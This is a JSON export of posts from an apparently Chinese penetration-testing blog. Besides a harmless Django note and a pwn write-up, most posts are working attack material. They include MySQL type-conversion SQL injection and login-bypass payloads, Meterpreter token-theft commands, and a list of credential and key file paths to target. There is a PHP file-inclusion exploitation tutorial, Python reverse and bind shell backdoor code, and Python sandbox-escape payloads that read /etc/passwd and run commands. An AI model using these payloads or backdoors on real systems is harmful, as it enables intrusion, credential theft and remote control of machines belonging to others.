[{"title":"MySQL类型转换","url":"/2018/12/11/MySQL类型转换/","content":"\n## 前言\n\n最近在研究Fuzzing技术时览到了[SQL注入常规Fuzz全记录](https://www.freebuf.com/articles/web/190019.html)这样一片文章。文中所利用的注入payload引起了我的关注，于是开始研究这个payload的原理。\n\n## MySQL类型转换 \n\n文中所利用的payload为\n```\nadmin'-(length(passwd)=48)-'\n```\n\n这里我本地进行测试\n```\nmysql> select length(database()); \n+--------------------+\n| length(database()) |\n+--------------------+\n|                  4 |\n+--------------------+\n1 row in set (0.00 sec)\n\nmysql> select * from aaa where admin='admin'-(length(database())=1) and passwd='admin';\n+----+-------+--------+\n| id | admin | passwd |\n+----+-------+--------+\n|  1 | admin | admin  |\n+----+-------+--------+\n1 row in set, 2 warnings (0.00 sec)\n\nmysql> select * from aaa where admin='admin'-(length(database())=4) and passwd='admin';\nEmpty set, 2 warnings (0.00 sec)\n```\n\n从上述执行结果可以看到数据库名的长度为4。当插入该payload为false时，结果为true，而插入payload为true时结果为warnings。\n```\n'admin'-(length(database())=1)  //返回ture\n'admin'-(length(database())=4) //返回false\n```\n\n为了更好的理解简化payload进行测试\n```\nmysql> select 'admin'-4;\n+-----------+\n| 'admin'-4 |\n+-----------+\n|        -4 |\n+-----------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql> select '4admin'-4;\n+------------+\n| '4admin'-4 |\n+------------+\n|          0 |\n+------------+\n1 row in set, 1 warning (0.00 sec)\n```\n\n这里可以看到当运算符与不同类型的操作数一起使用时，会发生类型转换。这里做运算时admin被转化成了0，4admin被转化为4。\n\n为了进一步理解该类型转换的具体原理，进而查阅了[MySQL的官方文档](https://dev.mysql.com/doc/refman/5.7/en/type-conversion.html)。可以看到官方文档的描述如下：\n\n当运算符与不同类型的操作数一起使用时，会发生类型转换以使操作数兼容。某些转换是隐式发生的。例如，MySQL会根据需要自动将字符串转换为数字，反之亦然。隐式转化规则如下：\n\n1、两个参数至少有一个是 NULL 时，比较的结果也是 NULL，例外是使用 <=> 对两个 NULL 做比较时会返回 1，这两种情况都不需要做类型转换。\n\n2、两个参数都是字符串，会按照字符串来比较，不做类型转换。\n\n3、两个参数都是整数，按照整数来比较，不做类型转换。\n\n4、十六进制的值和非数字做比较时，会被当做二进制串。\n\n5、有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为 timestamp。\n\n6、有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较。\n\n7、所有其他情况下，两个参数都会被转换为浮点数再进行比较。\n\n这也就解释了该payload语句形成的原因——在输入的vchar类型操作数与int型的操作数做减法运算时发生了隐士转化，vchar类型的操作数被转换成了数字进行运算。\n\n进一步测试：\n```\nmysql> select '1x' = 1;\n+----------+\n| '1x' = 1 |\n+----------+\n|        1 |\n+----------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql> select '1x2c' = 1;\n+------------+\n| '1x2c' = 1 |\n+------------+\n|          1 |\n+------------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql> select 'a1x2c' = 1;\n+-------------+\n| 'a1x2c' = 1 |\n+-------------+\n|           0 |\n+-------------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql> select 'a1x2c' = 2;\n+-------------+\n| 'a1x2c' = 2 |\n+-------------+\n|           0 |\n+-------------+\n1 row in set, 1 warning (0.01 sec)\n```\n从这些例子可以看出,当把字符串转为数字的时候，是从左边开始处理的。总结规则如下\n\n1、如果字符串的第一个字符就是非数字的字符，那么转换为数字就是0\n\n2、如果字符串以数字开头，那么转换时就将字符串开头的数字作为转换结果。如：132axc就会转换为132。\n\n3、如果字符串中都是数字，那么转换为数字就是整个字符串对应的数字。\n\n## MySQL类型转换在注入中的运用\n\nSQL注入利用一：\n这里引用[t00ls师傅的一片文章](https://www.t00ls.net/thread-48821-1-1.html)。\n文中描述的是过狗万能密码。其原理就是应用自动转换机制进行构造的。\n```\nmysql> select * from aaa;\n+----+-------+------------+\n| id | admin | passwd     |\n+----+-------+------------+\n|  1 | admin | admin      |\n|  2 | 1     | 1alert\"><\" |\n+----+-------+------------+\n2 rows in set (0.00 sec)\n\nmysql> select * from aaa where admin='xx'=0 limit 0,1 -- and passwd='xxx';\n    -> ;\n+----+-------+--------+\n| id | admin | passwd |\n+----+-------+--------+\n|  1 | admin | admin  |\n+----+-------+--------+\n1 row in set (0.00 sec)\n```\n\n可以看到'xx'与0比较，xx被隐式转化为了0，0=0，此时会显示全部结果，然而利用limit控制返回一条数据。成功执行。\n\nSQL注入利用二：\n利用该方法进行盲注。通过开始执行的payload我们可以根据结果来进行判断。\n```\n+----------------------+\n| length(database())=4 |\n+----------------------+\n|                    1 |\n+----------------------+\n1 row in set (0.00 sec)\n\nmysql> select length(database())=1;\n+----------------------+\n| length(database())=1 |\n+----------------------+\n|                    0 |\n+----------------------+\n1 row in set (0.00 sec)\n\n```\n可以看到等式成立返回1，等式不成立返回0。\n利用方式如下：\n```\nmysql> select * from aaa where admin='xxx'-(length(database())=4);\nEmpty set, 2 warnings (0.00 sec)\n\nmysql> select * from aaa where admin='xxx'-(length(database())=1);\n+----+-------+--------+\n| id | admin | passwd |\n+----+-------+--------+\n|  1 | admin | admin  |\n+----+-------+--------+\n1 row in set, 2 warnings (0.01 sec)\n```\n\n可以看到第一条数据返回结果为admin=-4,第二条返回的结果为admin=0。然后mysql会取表中与0相同的数据。由于隐形转化的结果，所有字符串开头的都会被匹配。\n```\nmysql> insert into aaa(admin,passwd) values('xxx','aaa');\nQuery OK, 1 row affected (0.01 sec)\n\nmysql> select * from aaa;\n+----+-------+------------+\n| id | admin | passwd     |\n+----+-------+------------+\n|  1 | admin | admin      |\n|  2 | 1     | 1alert\"><\" |\n|  3 | xxx   | aaa        |\n+----+-------+------------+\n3 rows in set (0.00 sec)\n\nmysql> select * from aaa where admin=0;\n+----+-------+--------+\n| id | admin | passwd |\n+----+-------+--------+\n|  1 | admin | admin  |\n|  3 | xxx   | aaa    |\n+----+-------+--------+\n2 rows in set, 2 warnings (0.00 sec)\n```\n利用这样的思路构造盲注语句\n```\nmysql> select * from aaa where admin='asd'-(ascii((substr(database(),1,1)))=116);\nEmpty set, 3 warnings (0.00 sec)\n\nmysql> select * from aaa where admin='asd'-(ascii((substr(database(),1,1)))=111);\n+----+-------+--------+\n| id | admin | passwd |\n+----+-------+--------+\n|  1 | admin | admin  |\n|  3 | xxx   | aaa    |\n+----+-------+--------+\n2 rows in set, 3 warnings (0.00 sec)\n```\n\n## 总结\n如果有其他利用的思路希望各位大佬补充。","tags":["MySQL"]},{"title":"pwn从零学习之路-0","url":"/2018/12/03/pwn从零学习之路-0/","content":"\n## Fd-题解\n\n### 题目内容\n\n```\nfd@ubuntu:~$ cat fd.c \n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar buf[32];\nint main(int argc, char* argv[], char* envp[]){\n \tif(argc<2){\n \t\tprintf(\"pass argv[1] a number\\n\");\n \t\treturn 0;\n \t}\n \tint fd = atoi( argv[1] ) - 0x1234;\n \tint len = 0;\n \tlen = read(fd, buf, 32);\n \tif(!strcmp(\"LETMEWIN\\n\", buf)){\n \t\tprintf(\"good job :)\\n\");\n \t\tsystem(\"/bin/cat flag\");\n \t\texit(0);\n \t}\n \tprintf(\"learn about Linux file IO\\n\");\n \treturn 0;\n}\n```\n\n### 解题思路\n\n使fd值为0，从而进入标准输入stdinr，然后输入LETMEWIN\n```\nfd@ubuntu:~$ ./fd 4660 \nLETMEWIN\ngood job :)\nmommy! I think I know what a file descriptor is!!\n```\n\n### 解题相关知识\n\n1、标准输入输出和错误\n\nlinux下使用标准输入文件stdin和标准输出文件stdout，来表示每个命令的输入和输出，还使用标准错误输出文件stderr用于输出错误信息。三个标准流都与系统与控制终端设备相连(如:键盘)。\n\n因此，在标准情况下，每个命令通常从相应的控制终端中获取输入，并将输出打印到控制终端屏幕上，如本题解题过程。也可以将程序重新定义，将stdin，stdout重定向。最基本的使用方法是定义到一个文件上，从一个文件获取输入，输出到另外的文件中。如read()，write()函数的使用。\n\n2、文件描述符\n\n在底层操作系统是不会通过文件指针来查找文件的，而是通过文件表示符来操作的。\n\n文件标识符以一系列证书，从0开始依次递增。但是一般系统标识符都是从3开始的。\n\n文件描述符0、1、2和终端相关。如果希望命令从文件中读取输入或输出到文件中，就需要使用文件重定向。\n\n系统默认打开三个流：\n\n| 文件描述符| 缩写 | 描述 |\n| :-: | :-: | :-: |\n| 0 | stdin | 标准输入(命令的输入，缺省和终端键盘关联) |\n| 1 | stdout | 标准输出(命令的输出，缺省和终端屏幕关联) |\n| 2 | stderr | 标准错误输出(命令的错误信息输出，缺省和终端屏幕关联) |\n\n3、重定向标准输出\n\n```\nwhoami > filename  #把命令标准输出重定向到一个文件中(如果文件存在，则内容覆盖)\nwhoami >> filename # 把命令标准输出重定向到文件中(尾部追加)\n```\n\n4、重定向标准输入\n\n```\nwhoami < filename  # 以filename文件作为命令whoami的标准输入\nwhoami << DELIMITER # 从标准输入中读入输入，直到遇到DELIMITER分解符\n```\n\n5、重定向标准错误\n\n```\nwhoami 2> filename # 把whoami命令的标准错误重定向到文件中(如果文件存在，则内容覆盖)\nwhoami >> filename # 把命令的标准错误重定向到文件中(尾部追加)\n```","tags":["pwn"]},{"title":"Token窃取","url":"/2018/11/27/Token窃取/","content":"\n\n## Windows Token类型\n\nDelegation token ( 授权令牌 ) :  \n\n用于交互会话登录 ( 例如本地用户直接登录、远程桌面登录 )\n\nImpersonation token ( 模拟令牌 ) :\n\n用于非交互登录 ( 利用 net use 访问共享文件夹 )\n\n注：两种 token 只在系统重启后清除， 具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation token，依旧有效。\n\n## Token窃取工具\n\n下载链接：[incognito](https://github.com/fdiskyou/incognito2)\n\n## MSF使用incognito\n\n查看当Token： getuid\n![](/img/media/15433030952129.jpg)\n\n加载incognito：load incognito\n![](/img/media/15433031122967.jpg)\n\n列举全部token：list_tokens -u\n![](/img/media/15433033831120.jpg)\n\nToken窃取: impersonate_token \"WIN-L6B129PFE38\\aaa\"\n![](/img/media/15433034372759.jpg)\n\n返回之前token：rev2self or drop_token\n![](/img/media/15433034850524.jpg)\n![](/img/media/15433035296170.jpg)\n\n另外该工具还可以从进程中窃取token：steal_token 2144\n![](/img/media/15433036305579.jpg)\n![](/img/media/15433036919354.jpg)\n\n## 总结\n\n通过对Windows令牌窃取，可以进行用户会话升权降权的操作。可以利用其他的用户身份去进行相应的操作。\n\n","tags":["内网渗透"]},{"title":"重要文件路径","url":"/2018/11/26/重要文件路径/","content":"\n\n### windows:\n\n```\nc:/boot.ini //查看系统版本 \nc:/windows/php.ini //php配置信息 \nc:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码\nc:/winnt/php.ini c:/winnt/my.ini c:/mysql/data/mysql/user.MYD //存储了mysql.user表中的数据库连接密码 \nc:/Program Files/RhinoSoft.com/Serv-U/ServUDaemon.ini //存储了虚拟主机网站路径和密码 \nc:/Program Files/Serv-U/ServUDaemon.ini c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置 \nc:/windows/repair/sam //存储了WINDOWS系统初次安装的密码 \nc:/Program Files/ Serv-U/ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 \nc:/Program Files/RhinoSoft.com/ServUDaemon.exe \nC:/Documents and Settings/All Users/Application Data/Symantec/pcAnywhere/*.cif文件 //存储了pcAnywhere的登陆密码 \nc:/Program Files/Apache Group/Apache/conf/httpd.conf 或C:/apache/conf/httpd.conf //查看WINDOWS系统apache文件 \nc:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. \nc:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 \nd:/APACHE/Apache2/conf/httpd.conf \nC:/Program Files/mysql/my.ini\nC:\\boot.ini //查看系统版本\nC:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件 \nC:\\Windows\\repair\\sam //存储系统初次安装的密码 \nC:\\Program Files\\mysql\\my.ini //Mysql配置 \nC:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root \nC:\\Windows\\php.ini //php配置信息 \nC:\\Windows\\my.ini //Mysql配置信息 \n```\n\n### Linux：\n\n```\n/root/.ssh/authorized_keys\n/root/.ssh/id_rsa\n/root/.ssh/id_ras.keystore\n/root/.ssh/known_hosts //记录每个访问计算机用户的公钥\n/etc/passwd\n/etc/shadow\n/etc/my.cnf //mysql配置文件\n/etc/httpd/conf/httpd.conf //apache配置文件\n/root/.bash_history //用户历史命令记录文件\n/root/.mysql_history //mysql历史命令记录文件\n/proc/mounts //记录系统挂载设备\n/porc/config.gz //内核配置文件\n/var/lib/mlocate/mlocate.db //全文件路径\n/porc/self/cmdline //当前进程的cmdline参数\n```\n","tags":["渗透测试"]},{"title":"文件包含漏洞","url":"/2018/11/26/文件包含漏洞/","content":"\n\n\n文章首发于[t00ls](https://www.t00ls.net/thread-44223-1-1.html)，重新搭建博客后将文章存放于博客内容中。\n\n## 前言\n\n文件包含漏洞是一种常见的漏洞类型，依赖于脚本运行时的web环境，当攻击者利用可控变量构造可执行的代码路径时，该漏洞会导致攻击者利用脚本运行来执行相应的文件。如果一个网站系统存在文件包含漏洞，会导致各种基于文件的攻击。\n\n## 文件包含漏洞成因\n\n服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可去包含一个恶意文件，而我们可以构造这个恶意文件来达到攻击的目的。\n\n## 文件包含漏洞类型\n\n1、本地文件包含:  \n\n可以包含本地文件，在条件允许时甚至能执行代码\n\n2、远程文件包含:  \n\n可以包含任意文件。\n\n条件:php.ini中allow_url_fopen和allow_url_include要为On\n\nallow_url_fopen：默认的封装协议提供ftp和http协议访问远程文件\n\nallow_url_include：改选项允许使用 include,inculde_once,require,require_once \n\n(这两项可以在phpinfo信息中查看是否开启)\n        \n## 文件包含函数\n\n```\ninclude, inculde_once\nrequire, require_once\n```\n这两个函数的区别如下:\n\n为了更好的理解这里我开启了debug  (改配置文件  display_error = on)\n\ninclude():\n\n当代码执行到该函数时，找不到包含文件时会产生警告，但是脚本会继续执行。(可以看到这里包含了一个本地并不存在的文件123.php 这里虽然出现了警告,但是脚本继续往下执行输出了123。)\n![](/img/media/15432151637772.jpg)\n\nrequire():\n\n只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本。(可以看到这里直接报错，后面的代码并没有被执行。\n![](/img/media/15432151806212.jpg)\n\n如果函数携带_once则表示已经包含过的代码不会被再次包含。\n\n## 本地文件包含\n\n```\n<?php \n$a = $_GET['file'];\ninclude($a);\n?>\n```\n这是一段简单的php文件包含代码，这里get获取了一个可控参数file并进行包含，这里我们可以控制它来包含我们想要的代码。\n\n这里直接将文件的内容包含，因此无论我们的文件后缀是何种形式的，如:jpg,txt等等均可以被包含并当作php代码执行。本地新建文件test.txt  内容为<?php phpinfo();?> 并对该文件包含\n![](/img/media/15432151950066.jpg)\n\n如图代码被成功包含并执行，界面显示出了phpinfo的内容。文件包含漏洞还可以包含本地服务器中的其他文件。这里因为我的环境是linux的所以可以尝试包含/etc/passwd。\n![](/img/media/15432152054790.jpg)\n\n当然这样包含还是需要一定条件的，因为这里我们是可以完全控制文件类型的，如果代码进行修改如下:\n```\n<?php \n$a = $_GET['file'].’php’;\ninclude($a);\n?>\n```\n代码中限制了文件类型，只有.php文件才被包含，这里如果按照刚才的方法进行包含的话，结果如下所示:\n![](/img/media/15432152154072.jpg)\n\n可以看出来当我们的参数传输进去时，变成了/etc/passwd.php  但是服务器中并未含有这个文件于是会报错。如果php版本小于5.3 并且magic_quotes_gpc = on  tomagic_quotes_gpc = off时我们可以使用%00截断后面的.php，但是在高版本中修复了这个问题。\n\n因为我们包含的并不只是文件而是文件的内容，因此我们可以进一步利用，这里创建一个执行命令的回显文件利用system函数执行。\n\n可以看出我们成功执行了代码。这里我们也可以编写一个shell上传然后利用菜刀链接这里就不做示范了。\n![](/img/media/15432152250063.jpg)\n\n## 远程文件包含\n\n本地文件包含与远程文件相同的原则，但前者只能包含服务器上存在的文件，后者可以包含远程服务器上的文件.\n\n之前介绍了远程包含的条件，这里还需要注意一点就是远程包含的语音不能和目标服务器语言一致，因为远程文件有php后缀和远程文件内容，远程服务器会运行代码后进行包含，包含过来的内容就不是本地服务器的了。\n\n图解如下: 本地服务器127.0.0.1  远程 192.168.40.130\n![](/img/media/15432152366926.jpg)\n![](/img/media/15432152426629.jpg)\n\n远程文件包含利用:\n![](/img/media/15432152527718.jpg)\n\n远程文件包含可以说是在以本地包含为基础，满足条件下的进一步利用。\n\n当然文件包含中还有相当多的伪协议如下:\n```\ndata:text/plain or data: text/plain; base64\nphp://input\nzip://\n```\n这里只列举了一部分还有很多大家可以自己去尝试\n\ndata:text/plain or data: text/plain; base64\n\n输出直接在对应的URL中显示参数  如果使用后者我们只需要将代码进行base64编码就行了\n![](/img/media/15432152661240.jpg)\n\nphp://input\n\n访问请求的原始数据的只读流，将post请求中的数据作为PHP代码执行。\n![](/img/media/15432152746887.jpg)\n\nZip: \n\n可以访问zip中的文件，但是需要一个绝对路径，这里的利用我们可以上传一个zip木马然后对改zip进行包含 从而获得一个shell\n首先我们本地创建一个cmd.php的文件 ,内容为：<?php system(“ipconfig”)?>  ,然后压缩为zip文件并改名为.jpg后缀 \n\n利用zip伪协议\n\n![](/img/media/15432152880097.jpg)\nPhp文件包含利用之包含临时文件\n\n利用条件:\n\n存在phpinfo页面、存在文件包含漏洞\n\n这里牵扯到一个php处理大文件流的一个知识点：默认PHP引擎对enctype=“multipart/form-data”请求处理流程：  \n\n1、 请求到达\n\n2、 创建临时文件，并写入上传文件内容\n\n3、 调用相应PHP脚本处理，比如校验文件后缀、移动文件等\n\n4、 删除临时文件\n\n当我们上传一个文件的时候他会先创建一个临时文件，我们的利用点就在这里，利用文件包含来包含上传的临时文件，但因为服务器请求速度过快，往往我们并未包含临时文件这个文件就被删除了。那么我们如何利用呢？\n\n这里牵扯到了分块传输编码：HTTP1.1支持的chunked编码传输方法，浏览器不需要等到内容字节全部下载完整，只需要接收一个chunked块即可解析页面，由于HTTP1.1采用持久连接，所以可以采用分块传输，并且只有响应包达到一定大小，无法预先判断报文大小使，才会采用chunked分块传输\n\n根据这个原理我们可以采用分块传输，提前获取临时文件名(利用phpinfo)填充大量无用请求延长脚本处理时间，并不断发送请求，这样便可以包含临时文件，在phpinfo的variables模块的_Fifles一栏中我们可以获得文件的路径，然后我们可以写脚本进行条件竞争，一边发送大量请求，一边不断包含。\n\n## 总结\n文件包含利用方式是无穷的，重点在于你的想象力，思想有多广利用程度就有多大。\n","tags":["渗透测试"]},{"title":"Django2.0 学习记录","url":"/2018/11/23/Django2-0-学习记录/","content":"\n## Django2.0学习记录\n\n### 基本使用\n```\n安装\npip install Django\n\n创建一个新的项目和应用\nDjango-admin startproject cms  // 项目\ncd cms\npython manage.py startapp we  //应用\n\n创建数据库并同步\npython manage.py makemigrations web  //创建数据库\npython manage.py migrate  //同步数据库\n\n创建超级用户\npython manage.py createsuperuser\n\n交互式shell\npython manage.py shell\n```\n\n### setting模块\n设置中文字体\n```\nLANGUAGE_CODE = 'zh_Hans'\nTIME_ZONE = 'Asia/Shanghai'\n```\n\n设置模版路径\n```\nTEMPLATES = [\n    {\n        ...\n        'DIRS': [os.path.join(BASE_DIR, 'templates')],\n        ...\n    },\n]\n```\n\n加载静态文件\n```\nSTATIC_URL = '/static/'\n\nSTATICFILES_DIRS = (\n    os.path.join(BASE_DIR, \"static\"),\n)\n```\n\n### model模块\n```\n表关系\n\n一对多，models.ForeignKey(ColorDic)\n一对一，models.OneToOneField(OneModel)\n多对多，authors = models.ManyToManyField(Author)\n\nField\nPositiveIntegerField  #正整数字段\n\n查看数据库结构\npython manage.py sqlmigrate polls 0001\n\non_delete(表关系)\n\non_delete=models.CASCADE级联删除\n当删除主表的数据时候从表中的数据也随着一起删除\n\nauto_now_add(DateTime)\n\nauto_now_add为添加时的时间，更新对象时不会有变动\n\nobjects.all()\n\nall返回的是QuerySet对象，程序并没有真的在数据库中执行SQL语句查询数据，但支持迭代，使用for循环可以获取数据\n\nobjects.get()与objects.filter()二者类似\n\nget返回的是Model对象，类型为列表，说明使用get方法会直接执行sql语句获取数据\n\n用于类型转换，将object的类型转换为可读的str型\ndef __str__(self): \n    return self.name\n\n显示中文名称\nclass Mate:\n    verbose_name = '标签'\n    verbose_name_plural = '标签'\n```\n\n### urls模块\n```\n<int:question_id>\n\npath('<int:question_id>/', views.detail, name='detail')\n<int:是一个转换器，用于确定哪些模式应与URL路径的这一部分匹配\n:question_id>定义将用于标识匹配模式的名称\n```\n\n### admin模块\n```\n显示内容更多属性\nclass PostAdmin(admin.ModelAdmin):\n    list_display = ['title', 'created_time', 'modified_time', 'category', 'author']\nadmin.site.register(Post,PostAdmin)\n```\n\n### view模块\n```\nmarkdown渲染\n\npip install markdwon\n\nimport markdown\n\ndef detail(request, pk):\n    post = get_object_or_404(Post, pk=pk)\n    post.body = markdown.markdown(post.body,\n                                  extensions=[\n                                     'markdown.extensions.extra',\n                                     'markdown.extensions.codehilite',\n                                     'markdown.extensions.toc',\n                                  ])\n    return render(request, 'blog/detail.html', context={'post': post})\n```\n","tags":["python","django"]},{"title":"Python Shell","url":"/2018/09/20/Python-Shell/","content":"\n## Python反向链接后门\n\n```\nimport socket, subprocess, os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM\ns.connect((host,port))\nos.dup2(s.fileno(),0) # 0代表系统的stdin\nos.dup2(s.fileno(),1) # 1代表系统的stdout\nos.dup2(s.fileno(),2) # 2代表系统的stderr\np=subprocess.call([\"/bin/sh\",\"-i\"])\n```\n\n## Python正向链接后门\n\n1. windows正向链接CmdShell\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading\n\ndef send(talk, proc):\n        import time\n        while True:\n                msg = proc.stdout.readline()\n                talk.send(msg)\n                \nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,\n                stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                shell=True)\nt = threading.Thread(target = send, args = (talk, proc))\nt.setDaemon(True)\nt.start()\nwhile True:\n    cmd=talk.recv(1024)\n    proc.stdin.write(cmd)\n    proc.stdin.flush()\nserver.close()\n```\n\n2. linux版/bin/sh\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading, sys\n\nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=talk,\n                        stdout=talk, stderr=talk, shell=True)\n\n```\n\n","tags":["python"]},{"title":"Python 沙箱逃逸payload","url":"/2018/09/20/Python-沙箱逃逸payload/","content":"\n1. (type 'file')   读文件\n\n```\n().__class__.__bases__[0].__subclasses__()[40](\"/etc/passwd\").read()\n```\n2. (type 'file')   写文件\n\n```\n().__class__.__bases__[0].__subclasses__()[40](\"123.txt\",'w').write('asdfqwer')\n```\n\n3. (class 'warnings.catch_warnings')  命令执行\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls\").read()')\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].os.system('ls')\n```\n4. timeit\n这个库主要是用来计时用的，用来计算函数的完成时间，后面的number=1表示函数只运行一次\n    提到timeit就由涉及到time based rce，这点跟mysq的时间延时注入很像，通过比对返回时间来获取文件内容\n    这里先来讲shell语句\n    if [ 1=1 ]; then sleep 2;fi;\n    if [ 1=2 ];then sleep 2 ;fi;\n    这里其实跟时间盲注是一个道理，，判断字符串然后返回时间，通过返回时间来进行比对，最终获取字符串\n\n```\n>> timeit.timeit(\"__import__('os').system('if [ $(whoami|cut -c 1) = y ];then sleep 2;fi;')\", number = 1)\n2.016458034515381\n>>> timeit.timeit(\"__import__('os').system('if [ $(whoami|cut -c 1) = q ];then sleep 2;fi;')\", number = 1)\n0.009487152099609375\n```\n5. platform\n这个库主要是用来识别系统什么的，这里其实最重要的是引入了popen来执行命令，因此也可用作命令执行\n\n```\nimport platform\nplatform.popen('ls').read()\n```\n6. 黑名单绕过\ndict 拼接函数\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')\n```\nbase64拼接函数\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['b3M='.decode('base64')].__dict__['c3lzdGVt'.decode('base64')]('ls')\n```","tags":["python"]}]